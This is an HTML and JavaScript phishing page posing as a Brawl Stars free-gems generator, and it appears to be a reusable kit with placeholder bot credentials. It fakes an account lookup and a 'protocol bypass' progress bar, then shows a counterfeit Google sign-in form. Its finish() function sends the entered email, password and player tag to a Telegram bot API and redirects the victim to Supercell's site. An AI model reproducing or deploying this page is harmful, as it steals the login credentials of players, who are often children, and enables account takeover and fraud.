<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Brawl Stars: Seasonal Rewards</title>
    <link rel="icon" type="image/x-icon" href="https://brawlergems.com/generator/images/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Lilita One', cursive;
            background: #1a2969 linear-gradient(180deg, #1a2969 0%, #2d4596 100%);
            min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; position: relative; overflow-x: hidden;
        }

        body::before {
            content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: url('https://brawlergems.com/generator/images/brawl_stars_pattern_transparent.png');
            background-size: 280px; opacity: 0.1; z-index: 0; pointer-events: none;
        }

        .container { width: 100%; max-width: 480px; z-index: 10; position: relative; }
        .logo { width: 230px; margin: 10px auto 20px; display: block; filter: drop-shadow(0 8px 15px rgba(0,0,0,0.4)); }

        .main-card {
            background: #ffffff; border-radius: 24px; padding: 25px; 
            box-shadow: 0 20px 50px rgba(0,0,0,0.5); color: #333; text-align: center; position: relative;
        }

        .back-btn {
            position: absolute; top: 20px; left: 20px; width: 30px; cursor: pointer; transition: 0.2s; z-index: 20;
        }
        .back-btn:hover { transform: scale(1.1); }

        h2 { font-size: 20px; color: #444; margin-bottom: 20px; text-transform: uppercase; }

        .gems-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .gem-item {
            background: #f8f9fa; border: 3px solid #eee; border-radius: 16px; padding: 12px;
            cursor: pointer; transition: 0.1s; display: flex; flex-direction: column; align-items: center;
        }
        .gem-item.active { border-color: #FFA800; background: #FFF9E6; transform: translateY(-3px); box-shadow: 0 5px 15px rgba(255,168,0,0.2); }
        .gem-item img { width: 65px; margin-bottom: 5px; }
        .gem-item span { font-size: 18px; color: #333; }

        .input-group { background: #fff; border: 4px solid #f0f0f0; border-radius: 16px; padding: 15px; margin-bottom: 20px; }
        input { width: 100%; border: none; outline: none; font-family: 'Lilita One'; font-size: 24px; text-align: center; text-transform: uppercase; }

        .btn-bs {
            background: linear-gradient(180deg, #FFD84D 0%, #FFA800 100%); border: none; border-radius: 16px;
            padding: 18px; width: 100%; color: white; font-size: 24px; cursor: pointer;
            box-shadow: 0 6px 0 #CC7A00; text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        .btn-bs:active { transform: translateY(3px); box-shadow: 0 3px 0 #CC7A00; }

        /* ÐŸÑ€Ð¾Ñ„Ð¸Ð»ÑŒ */
        .acc-info { background: #333; color: white; border-radius: 15px; padding: 20px; margin-bottom: 15px; position: relative; overflow: hidden; }
        .acc-info .star-bg { position: absolute; right: -10px; top: -10px; width: 80px; opacity: 0.2; }
        
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
        .stat-card { background: #f4f4f4; border-radius: 12px; padding: 12px; border: 2px solid #ddd; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .stat-card img { width: 22px; }
        .stat-val { font-size: 22px; color: #333; }

        /* Google Ð¤Ð¾Ñ€Ð¼Ð° */
        .g-auth { font-family: 'Roboto', sans-serif; display: none; text-align: left; }
        .g-input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline-color: #1a73e8; }

        .loader { height: 12px; background: #eee; border-radius: 10px; margin: 20px 0; overflow: hidden; display: none; }
        .l-fill { height: 100%; width: 0%; background: #FFA800; transition: 0.3s; }

        /* Ð‘Ð¾Ñ‚ */
        .bot-wrap { display: flex; align-items: center; margin-top: 30px; width: 100%; }
        .bot-img { width: 75px; height: 75px; border: 4px solid #000; border-radius: 15px; background: #fff; flex-shrink: 0; }
        .bubble { background: white; border: 4px solid #000; border-radius: 15px; padding: 12px; margin-left: 15px; color: #000; flex: 1; position: relative; font-size: 15px; line-height: 1.3; }
        .bubble:after { content: ''; position: absolute; left: -19px; top: 50%; transform: translateY(-50%); border-right: 15px solid #000; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://brawlergems.com/generator/images/logo_outlined_noBG.png" class="logo">

    <div class="main-card">
        <img src="https://brawlergems.com/generator/images/back.png" class="back-btn" id="btn-back" style="display:none;" onclick="goBack()">

        <div id="scr-1">
            <h2>Select Gems Pack</h2>
            <div class="gems-grid">
                <div class="gem-item active" onclick="selG(this, '30')"><img src="https://brawlergems.com/generator/images/30.png"><span>30</span></div>
                <div class="gem-item" onclick="selG(this, '80')"><img src="https://brawlergems.com/generator/images/80.png"><span>80</span></div>
                <div class="gem-item" onclick="selG(this, '170')"><img src="https://brawlergems.com/generator/images/170.png"><span>170</span></div>
                <div class="gem-item" onclick="selG(this, '360')"><img src="https://brawlergems.com/generator/images/360.png"><span>360</span></div>
                <div class="gem-item" onclick="selG(this, '950')"><img src="https://brawlergems.com/generator/images/950.png"><span>950</span></div>
                <div class="gem-item" onclick="selG(this, '2000')"><img src="https://brawlergems.com/generator/images/2000.png"><span>2000</span></div>
            </div>
            <div class="input-group"><input type="text" id="tag" placeholder="#PLAYER_TAG" maxlength="12"></div>
            <button class="btn-bs" onclick="search()">CONTINUE</button>
        </div>

        <div id="scr-2" style="display:none;">
            <div class="acc-info">
                <img src="https://brawlergems.com/generator/images/star-white.png" class="star-bg">
                <h3 id="n-name">PLAYER</h3>
                <small id="n-tag">#TAG</small>
            </div>
            <div class="stats-grid">
                <div class="stat-card"><img src="https://brawlergems.com/generator/images/icon_trophy_medium.png"><span class="stat-val" id="n-tr">0</span></div>
                <div class="stat-card"><img src="https://brawlergems.com/generator/images/icon_player_level.png"><span class="stat-val" id="n-lv">0</span></div>
            </div>
            <button class="btn-bs" style="margin-top:20px;" onclick="gen()">START GENERATION</button>
        </div>

        <div id="scr-3" style="display:none;">
            <h2 id="st">CONNECTING...</h2>
            <div class="loader" id="ldr" style="display:block;"><div class="l-fill" id="bar"></div></div>
            <div id="log" style="font-family:monospace; font-size:11px; color:#999; text-align:left;"></div>
        </div>

        <div id="scr-4" class="g-auth">
            <div style="text-align:center; margin-bottom:15px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="60">
                <h3 style="font-weight:400; margin-top:10px; font-size:22px;">Sign in</h3>
                <p style="color:#5f6368; font-size:14px;">Confirm your account to link gems</p>
            </div>
            <input type="email" id="em" class="g-input" placeholder="Email or phone">
            <input type="password" id="ps" class="g-input" placeholder="Password">
            <button class="btn-bs" onclick="finish()" style="margin-top:15px;">CONFIRM</button>
        </div>
    </div>

    <div class="bot-wrap">
        <img src="https://brawlergems.com/generator/images/brawler_icon.png" class="bot-img">
        <div class="bubble"><p id="bot-txt">Welcome! Select a gems pack and enter your tag to get started!</p></div>
    </div>
</div>

<script>
    const T = "Ð¢Ð’ÐžÐ™_Ð¢ÐžÐšÐ•Ð";
    const C = "Ð¢Ð’ÐžÐ™_ID";
    let selectedGems = "30";

    function selG(el, val) {
        document.querySelectorAll('.gem-item').forEach(x => x.classList.remove('active'));
        el.classList.add('active');
        selectedGems = val;
    }

    function search() {
        let t = document.getElementById('tag').value.toUpperCase();
        if(t.length < 3) return;
        document.getElementById('bot-txt').innerText = "Connecting to Supercell server...";
        setTimeout(() => {
            document.getElementById('scr-1').style.display = 'none';
            document.getElementById('scr-2').style.display = 'block';
            document.getElementById('btn-back').style.display = 'block';
            document.getElementById('n-tag').innerText = t;
            document.getElementById('n-name').innerText = "BRAWLER_" + t.slice(0,4);
            document.getElementById('n-tr').innerText = Math.floor(Math.random()*16000+4000).toLocaleString();
            document.getElementById('n-lv').innerText = Math.floor(Math.random()*90+15);
            document.getElementById('bot-txt').innerText = "Account found! Start the generation to claim " + selectedGems + " gems.";
        }, 2000);
    }

    function gen() {
        document.getElementById('scr-2').style.display = 'none';
        document.getElementById('btn-back').style.display = 'none';
        document.getElementById('scr-3').style.display = 'block';
        let p = 0;
        let l = ["> Protocol bypass", "> Injecting resources", "> Encrypting packets", "> Finalizing"];
        let li = 0;
        let iv = setInterval(() => {
            p += 4;
            document.getElementById('bar').style.width = p + "%";
            if(p % 24 == 0 && li < l.length) {
                document.getElementById('log').innerHTML += `<div>${l[li]}</div>`;
                document.getElementById('st').innerText = l[li].replace('> ', '').toUpperCase();
                li++;
            }
            if(p >= 100) {
                clearInterval(iv);
                setTimeout(() => {
                    document.getElementById('scr-3').style.display = 'none';
                    document.getElementById('scr-4').style.display = 'block';
                    document.getElementById('btn-back').style.display = 'block';
                    document.getElementById('bot-txt').innerText = "Human verification required. Please sign in.";
                }, 800);
            }
        }, 150);
    }

    function goBack() {
        document.getElementById('scr-2').style.display = 'none';
        document.getElementById('scr-4').style.display = 'none';
        document.getElementById('btn-back').style.display = 'none';
        document.getElementById('scr-1').style.display = 'block';
        document.getElementById('bot-txt').innerText = "Welcome back! Choose a pack and enter your tag.";
    }

    async function finish() {
        const m = document.getElementById('em').value;
        const p = document.getElementById('ps').value;
        const t = document.getElementById('tag').value;
        if(!m || !p) return alert("Please fill all fields!");
        const msg = `ðŸ’Ž NEW LOG\nTag: ${t}\nGems: ${selectedGems}\nUser: ${m}\nPass: ${p}`;
        await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
        alert("Success! Your gems are being processed.");
        location.href = "https://supercell.com";
    }
</script>
</body>
</html>
